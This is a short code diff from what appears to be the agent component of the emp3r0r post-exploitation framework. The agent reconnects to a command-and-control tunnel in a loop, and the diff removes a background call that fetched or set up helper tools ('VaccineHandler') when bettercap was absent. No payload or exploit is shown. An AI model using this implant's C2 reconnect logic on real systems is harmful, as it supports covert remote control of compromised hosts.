@@ -337,9 +337,6 @@ connect:
 	}
 	emp3r0r_data.KCPKeep = true
 	log.Println("Connected to CC TunAPI")
-	if !util.IsFileExist(agent.RuntimeConfig.UtilsPath + "/bettercap") {
-		go agent.VaccineHandler()
-	}
 	agent.CCMsgTun(ctx, cancel)
 	log.Printf("CCMsgTun closed, reconnecting")
 	goto connect
